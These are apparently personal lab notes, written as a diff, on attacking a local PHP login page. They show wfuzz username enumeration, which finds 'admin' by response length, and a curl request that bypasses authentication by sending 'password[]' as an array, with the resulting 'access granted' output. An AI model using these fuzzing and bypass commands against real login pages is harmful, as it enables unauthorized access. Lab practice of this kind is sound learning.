@@ -1,0 +1,74 @@
+
+::: service apache2 start
+
+::: cd /var/www/html
+
+
+
+::: wfuzz -c --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -d 'usuario=FUZZ&passowrd=test' http://localhost/login.php
+
+      
+      ID           Response   Lines    Word       Chars       Payload
+      =====================================================================
+
+      000000001:   200        15 L     41 W       482 Ch      "# directory-list-2.3-medium.txt"
+      000000005:   200        15 L     41 W       482 Ch      "# This work is licensed under the Creative Commons"
+      000000009:   200        15 L     41 W       482 Ch      "# Suite 300, San Francisco, California, 94105, USA."
+      000000004:   200        15 L     41 W       482 Ch      "#"
+                                                                                                                                                                                                                                        000000025:   200        15 L     41 W       482 Ch      "contact"
+                                                                                                                                                                                                                                        000000028:   200        15 L     41 W       482 Ch      "spacer"
+                                                                                                                                                                                                                                        000000017:   200        15 L     41 W       482 Ch      "download"
+                                                                                                                                                                                                                                        000000026:   200        15 L     41 W       482 Ch      "about"
+                                                                                                                                                                                                                                        000000013:   200        15 L     41 W       482 Ch      "#"
+                                                                                                                                                                                                                                        000000021:   200        15 L     41 W       482 Ch      "serial"
+                                                                                                                                                                                                                                        000000016:   200        15 L     41 W       482 Ch      "images"
+                                                                                                                                                                                                                                        000000020:   200        15 L     41 W       482 Ch      "crack"
+                                                                                                                                                                                                                                        000000018:   200        15 L     41 W       482 Ch      "2006"
+                                                                                                                                                                                                                                        000000019:   200        15 L     41 W       482 Ch      "news"
+
+
+::: wfuzz -c --hh=429 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -d 'usuario=FUZZ&passowrd=test' http://localhost/login.php
+
+
+                !!!!!    --hh=483      <<<+++----
+    
+    ID           Response   Lines    Word       Chars       Payload
+    =====================================================================
+
+    000000259:   200        15 L     41 W       483 Ch      "admin"
+
+
+
+
+
+
+##########################################CURL CURL CURL                      ########################
+
+
+
+::: curl -s -X POST --data 'usuario=admin&password=contrasena' http://127.0.0.1/login.php 
+
+    -s    silent
+
+
+::: curl -s -X POST --data 'usuario=admin&password=contrasena' http://127.0.0.1/login.php  | html2text
+
+  ****** Secure Login Page ******
+
+  ===============================================================================
+                Usuaio: [usuario                       ] Password:
+                                   [******************************] [login]
+                                   Hola goro \ login.php La password es incorrecta! :(
+
+
+::: curl -s -X POST --data 'usuario=admin&password[]=contrasena' http://127.0.0.1/login.php  | html2text
+
+  ****** Secure Login Page ******
+
+  ===============================================================================
+                Usuaio: [usuario                       ] Password:
+                                   [******************************] [login]
+                                   Hola goro \ login.php Acceso Garantizado... El PIN es 4671
+
+        
+                [] [] [] [] [] []     password[]=     XD :)
